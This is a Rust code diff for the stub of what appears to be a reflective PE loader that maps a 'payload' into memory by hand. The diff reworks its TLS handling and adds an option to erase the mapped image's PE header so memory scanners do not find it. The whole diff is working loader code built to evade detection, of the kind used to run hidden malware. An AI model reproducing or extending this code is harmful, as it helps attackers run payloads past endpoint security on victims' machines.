@@ -17,7 +17,7 @@ use windows::Win32::System::SystemServices::{
     IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
     IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
 };
-use windows::Win32::System::Threading::{GetCurrentProcess, TlsAlloc};
+use windows::Win32::System::Threading::GetCurrentProcess;
 
 /// Entry point signature of a mapped EXE (returns the process exit code).
 type ExeEntryPoint = unsafe extern "system" fn() -> u32;
@@ -38,9 +38,14 @@ const EXPECTED_MAGIC: u16 = 0x20b;
 #[cfg(target_arch = "x86")]
 const EXPECTED_MAGIC: u16 = 0x10b;
 
+/// Whether to zero the mapped image's PE header before any payload code runs
+/// (`params.erase_header`), so a memory scan does not find an `MZ`/`PE` pair at
+/// the mapped base. Substituted at build time by `Params::render_fragment`.
+const ERASE_HEADER: bool = $ERASE_HEADER$;
+
 /// `IMAGE_TLS_DIRECTORY` for the stub's architecture. The 32-bit layout is
 /// defined by hand: the `windows` crate only exposes the 64-bit one, and the
-/// field names match it so the provisioning code stays shared.
+/// field names match it so the callback walk stays shared.
 #[cfg(target_arch = "x86_64")]
 type TlsDirectory = windows::Win32::System::SystemServices::IMAGE_TLS_DIRECTORY64;
 #[cfg(target_arch = "x86")]
@@ -65,64 +70,6 @@ fn nt_error(label: String, status: i32) -> String {
 fn section_error(label: String, section: &str) -> String {
     format!("{label}: {section}")
 }
-
-/// `TlsAlloc`'s failure value.
-const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
-
-/// `TEB->ThreadLocalStoragePointer`: the per-thread array of module TLS blocks
-/// that a CRT reads through `_tls_index`. `gs:[0x58]` on x64, `fs:[0x2C]` on x86.
-///
-/// `TlsAlloc`/`TlsSetValue` do **not** write it: they use `TEB->TlsSlots`
-/// (`gs:[0x1480]` / `fs:[0xE10]`), a different array. Pointing a mapped image's
-/// `_tls_index` at a `TlsSetValue` slot therefore leaves it reading another
-/// module's block — measured, on both architectures, before this was fixed.
-#[cfg(target_arch = "x86_64")]
-const TEB_TLS_ARRAY_OFFSET: u32 = 0x58;
-#[cfg(target_arch = "x86")]
-const TEB_TLS_ARRAY_OFFSET: u32 = 0x2C;
-
-/// The PEB in the TEB: `gs:[0x60]` on x64, `fs:[0x30]` on x86.
-#[cfg(target_arch = "x86_64")]
-const PEB_TEB_OFFSET: u32 = 0x60;
-#[cfg(target_arch = "x86")]
-const PEB_TEB_OFFSET: u32 = 0x30;
-
-/// `PEB->Ldr`.
-#[cfg(target_arch = "x86_64")]
-const PEB_LDR_OFFSET: usize = 0x18;
-#[cfg(target_arch = "x86")]
-const PEB_LDR_OFFSET: usize = 0x0C;
-
-/// `LDR_DATA_TABLE_ENTRY::InLoadOrderLinks` and `::DllBase`.
-#[cfg(target_arch = "x86_64")]
-const LDR_IN_LOAD_ORDER_OFFSET: usize = 0x10;
-#[cfg(target_arch = "x86")]
-const LDR_IN_LOAD_ORDER_OFFSET: usize = 0x0C;
-#[cfg(target_arch = "x86_64")]
-const LDR_DLL_BASE_OFFSET: usize = 0x30;
-#[cfg(target_arch = "x86")]
-const LDR_DLL_BASE_OFFSET: usize = 0x18;
-
-/// `IMAGE_OPTIONAL_HEADER::NumberOfRvaAndSizes` and `::DataDirectory`, which
-/// sit at different offsets in PE32 and PE32+.
-#[cfg(target_arch = "x86_64")]
-const NUM_DIRECTORIES_OFFSET: usize = 108;
-#[cfg(target_arch = "x86")]
-const NUM_DIRECTORIES_OFFSET: usize = 92;
-#[cfg(target_arch = "x86_64")]
-const DATA_DIRECTORY_OFFSET: usize = 112;
-#[cfg(target_arch = "x86")]
-const DATA_DIRECTORY_OFFSET: usize = 96;
-
-/// `IMAGE_DIRECTORY_ENTRY_TLS`.
-const TLS_DIRECTORY_INDEX: usize = 9;
-
-/// `IMAGE_TLS_DIRECTORY::AddressOfIndex`: after two pointer-sized addresses,
-/// so 8 in PE32 and 16 in PE32+.
-#[cfg(target_arch = "x86_64")]
-const TLS_INDEX_FIELD_OFFSET: usize = 16;
-#[cfg(target_arch = "x86")]
-const TLS_INDEX_FIELD_OFFSET: usize = 8;
 
 /// A base relocation entry (type + offset packed in a `u16`).
 #[repr(C)]
@@ -174,11 +121,21 @@ pub unsafe fn run_reflective(
     crate::tech_dbg!("reflective_loading", "relocations applied");
     fix_memory_protections(image_base, nt)?;
     crate::tech_dbg!("reflective_loading", "section protections applied");
-    // The loader would have provisioned TLS before running any payload code;
-    // `TlsSetValue` below only reaches the calling thread, so the payload runs
-    // on this one too (see `execute_entrypoint`).
-    provision_tls(image_base, nt)?;
-    crate::tech_dbg!("reflective_loading", "TLS provisioned on the current thread");
+    // A manually mapped image never gets a TLS index from the OS. Running the
+    // payload's `DLL_PROCESS_ATTACH` callbacks initializes its global state;
+    // provisioning per-thread TLS is out of scope (see `run_tls_callbacks`).
+    run_tls_callbacks(image_base, nt);
+    crate::tech_dbg!("reflective_loading", "TLS callbacks executed");
+
+    // Opt-in and last among the loader's own steps: zero the mapped image's PE
+    // header before any payload code runs (entry point, `DllMain` or export).
+    // Export resolution below reads the payload buffer's header (`nt`) and the
+    // export tables inside a section, never the mapped header, so the export
+    // path is covered too.
+    if ERASE_HEADER {
+        erase_mapped_header(image_base, nt);
+        crate::tech_dbg!("reflective_loading", "mapped PE header erased");
+    }
 
     if let Some(name) = export {
         // Initialize the library first: a mapped DLL's CRT/global constructors
@@ -278,6 +235,25 @@ fn copy_headers(
         ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
     }
     Ok(())
+}
+
+/// Zeroes the mapped image's PE header (`SizeOfHeaders` bytes at its base).
+///
+/// The loader reads every later step's metadata from the payload buffer (`nt`),
+/// not from the mapped copy, and `copy_headers` left the header pages writable
+/// (they are covered by no section, so `fix_memory_protections` never touched
+/// them) — a plain `write_bytes` needs no protection change. A payload whose
+/// own startup code reads its image's PE header (for example the MSVC CRT) can
+/// break, which is why `params.erase_header` is opt-in.
+fn erase_mapped_header(image_base: *mut c_void, nt: *const NtHeaders) {
+    unsafe {
+        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
+        if size > 0 {
+            // SAFETY: `image_base` is the image allocated by `allocate_image`
+            // and `copy_headers` left the first `SizeOfHeaders` bytes writable.
+            ptr::write_bytes(image_base as *mut u8, 0, size);
+        }
+    }
 }
 
 fn copy_sections(
@@ -459,215 +435,46 @@ fn fix_memory_protections(
     Ok(())
 }
 
-/// Provisions the payload's TLS the way the loader would, then runs its
-/// `DLL_PROCESS_ATTACH` callbacks.
+/// Runs the payload's `DLL_PROCESS_ATTACH` TLS callbacks, the way the loader
+/// would, and nothing more.
 ///
-/// A manually mapped image never gets a TLS index from the OS: the module's
-/// `_tls_index` (the DWORD `AddressOfIndex` points at)
-/// stays zero and no thread's TLS slot is ever filled in. The CRT reads its
-/// per-thread state through that index, so a Rust (or otherwise CRT-using)
-/// payload fast-fails with `STATUS_STACK_BUFFER_OVERRUN` on its first
-/// thread-local access. This allocates an index, materializes the `.tls`
-/// template in a private block and points the calling thread's slot at it.
-///
-/// The slot lives in the loader's array ([`TEB_TLS_ARRAY_OFFSET`]) — the one a
-/// CRT actually reads; `TlsSetValue` writes a different one, which left the
-/// payload reading another module's block (measured). The index still has to
-/// come from `TlsAlloc`, because the reservation it makes is what the thread's
-/// teardown expects: an entry whose index the process does not claim is torn
-/// down as garbage when the thread exits (ntdll reads the block header at
-/// `block - 8`; measured on both architectures). The index `TlsAlloc` returns
-/// can coincide with a loaded module's — see the limitation below.
-///
-/// Limitations:
-///
-/// - TLS slots are per thread. Threads the payload creates itself get a zeroed
-///   slot for this index, so a payload that spawns threads and touches
-///   thread-local state on them needs a TLS-aware thread trampoline (out of
-///   scope).
-/// - When the index coincides with a loaded module's, that module's
-///   thread-locals in *this* thread are the payload's template bytes. Which
-///   index that is depends on the host process; `build.stub.debug` logs it.
-/// - A module the payload loads *later* can be handed the same index, which
-///   replaces the block; payloads that load TLS-using DLLs are out of scope.
-fn provision_tls(
-    image_base: *mut c_void,
-    nt: *const NtHeaders,
-) -> Result<(), String> {
+/// A manually mapped image has no TLS index: the OS never assigns one, and a
+/// payload whose CRT relies on `_tls_index` for per-thread state
+/// (`thread_local!`, `__declspec(thread)`, the CRT's own per-thread data) is
+/// out of scope. Provisioning that state correctly needs the loader's
+/// *static*-TLS path (`LdrpHandleTlsData`), not the dynamic `TlsAlloc`/`TlsSetValue`
+/// index space; writing a dynamic index into the static
+/// `ThreadLocalStoragePointer` array corrupts the heap at thread exit. This
+/// mirrors the project's original `void-loader` mapper, which only ran the
+/// callbacks and never provisioned a block.
+fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) {
     unsafe {
-        let tls_dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
+        let tls_dir =
+            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
         if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
-            return Ok(());
+            return;
         }
 
         let tls =
             (image_base as usize + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
         let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
-        let index_field = (*tls).AddressOfIndex as *mut u32;
-        let raw_start = (*tls).StartAddressOfRawData as usize;
-        let raw_len = ((*tls).EndAddressOfRawData as usize).saturating_sub(raw_start);
-        let zero_fill = (*tls).SizeOfZeroFill as usize;
-
-        if !index_field.is_null() && raw_len + zero_fill > 0 {
-            let array = tls_array();
-            if array.is_null() {
-                return Err($MSG_TLS_UNAVAILABLE$);
-            }
-            let index = TlsAlloc();
-            if index == TLS_OUT_OF_INDEXES {
-                return Err($MSG_TLS_UNAVAILABLE$);
-            }
-            if used_module_tls_indices().contains(&index) {
-                crate::tech_dbg!(
-                    "reflective_loading",
-                    "payload TLS index {index} is also a loaded module's"
-                );
-            }
-            // What the payload's CRT reads as `_tls_index`.
-            *index_field = index;
-
-            // Enough for the template plus the zero-filled tail; the loader
-            // gives every thread its own copy, so thread-locals start at their
-            // image-initialized values.
-            let mut block = ptr::null_mut();
-            let mut size = raw_len + zero_fill;
-            let status = crate::nt_alloc_vm(
-                GetCurrentProcess(),
-                &mut block,
-                0,
-                &mut size,
-                MEM_COMMIT.0 | MEM_RESERVE.0,
-                PAGE_READWRITE.0,
-            );
-            if status < 0 || block.is_null() {
-                return Err($MSG_TLS_UNAVAILABLE$);
-            }
-            if raw_len > 0 {
-                ptr::copy_nonoverlapping(raw_start as *const u8, block as *mut u8, raw_len);
-            }
-            // The slot holds a pointer to the per-thread block — the write the
-            // loader makes for every module TLS entry of the thread.
-            array.add(index as usize).write(block);
-            crate::tech_dbg!(
-                "reflective_loading",
-                "payload TLS index {index} ({} bytes)",
-                raw_len + zero_fill
-            );
+        if callbacks.is_null() {
+            return;
         }
 
-        if !callbacks.is_null() {
-            let mut i = 0usize;
-            while let Some(callback) = *callbacks.add(i) {
-                callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
-                i += 1;
-            }
+        let mut i = 0usize;
+        while let Some(callback) = *callbacks.add(i) {
+            callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
+            i += 1;
         }
     }
-    Ok(())
-}
-
-/// The calling thread's `ThreadLocalStoragePointer` array — the one a CRT
-/// indexes with `_tls_index`.
-unsafe fn tls_array() -> *mut *mut c_void {
-    let array: *mut *mut c_void;
-    #[cfg(target_arch = "x86_64")]
-    core::arch::asm!(
-        "mov {}, gs:[{}]",
-        out(reg) array,
-        const TEB_TLS_ARRAY_OFFSET,
-        options(nostack, preserves_flags, readonly)
-    );
-    #[cfg(target_arch = "x86")]
-    core::arch::asm!(
-        "mov {}, fs:[{}]",
-        out(reg) array,
-        const TEB_TLS_ARRAY_OFFSET,
-        options(nostack, preserves_flags, readonly)
-    );
-    array
-}
-
-/// The current process's PEB.
-unsafe fn current_peb() -> *const u8 {
-    let peb: *const u8;
-    #[cfg(target_arch = "x86_64")]
-    core::arch::asm!(
-        "mov {}, gs:[{}]",
-        out(reg) peb,
-        const PEB_TEB_OFFSET,
-        options(nostack, preserves_flags, readonly)
-    );
-    #[cfg(target_arch = "x86")]
-    core::arch::asm!(
-        "mov {}, fs:[{}]",
-        out(reg) peb,
-        const PEB_TEB_OFFSET,
-        options(nostack, preserves_flags, readonly)
-    );
-    peb
-}
-
-/// The `_tls_index` of every module the process has loaded (skipping the ones
-/// without a TLS directory). Used only for the diagnostic that reports an index
-/// collision.
-unsafe fn used_module_tls_indices() -> Vec<u32> {
-    let mut used = Vec::new();
-    let peb = current_peb();
-    if peb.is_null() {
-        return used;
-    }
-    let ldr = peb.add(PEB_LDR_OFFSET).cast::<*const u8>().read();
-    if ldr.is_null() {
-        return used;
-    }
-
-    let head = ldr.add(LDR_IN_LOAD_ORDER_OFFSET);
-    let mut entry = head.cast::<*const u8>().read();
-    let mut guard = 0u32;
-    while !entry.is_null() && entry != head && guard < 256 {
-        guard += 1;
-        let base = entry.add(LDR_DLL_BASE_OFFSET).cast::<*const u8>().read() as usize;
-        if let Some(index) = module_tls_index(base) {
-            used.push(index);
-        }
-        entry = entry.cast::<*const u8>().read();
-    }
-    used
-}
-
-/// Reads a loaded module's `_tls_index` out of its PE headers (`None` when the
-/// module has no TLS directory).
-unsafe fn module_tls_index(base: usize) -> Option<u32> {
-    if base == 0 {
-        return None;
-    }
-    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
-    if e_lfanew == 0 || e_lfanew > 0x1000 {
-        return None;
-    }
-    let optional = base + e_lfanew + 4 + 20;
-    if *((optional + NUM_DIRECTORIES_OFFSET) as *const u32) as usize <= TLS_DIRECTORY_INDEX {
-        return None;
-    }
-    let tls_rva =
-        *((optional + DATA_DIRECTORY_OFFSET + TLS_DIRECTORY_INDEX * 8) as *const u32) as usize;
-    if tls_rva == 0 {
-        return None;
-    }
-    // `AddressOfIndex` is a VA: pointer-sized in both PE32 and PE32+.
-    let index_va = *((base + tls_rva + TLS_INDEX_FIELD_OFFSET) as *const usize);
-    if index_va == 0 {
-        return None;
-    }
-    Some(*((index_va) as *const u32))
 }
 
 /// Runs the payload's entry point on this thread and returns its exit code.
 ///
-/// The payload keeps the stub's thread (rather than getting a fresh one): the
-/// TLS slot provisioned above belongs to the calling thread, and the payload's
-/// CRT reads it from there. A payload that calls `ExitProcess` ends the process,
-/// exactly as it would from a thread it created itself.
+/// The payload keeps the stub's thread rather than getting a fresh one. A
+/// payload that calls `ExitProcess` ends the process, exactly as it would from
+/// a thread it created itself.
 fn execute_entrypoint(
     image_base: *mut c_void,
     nt: *const NtHeaders,
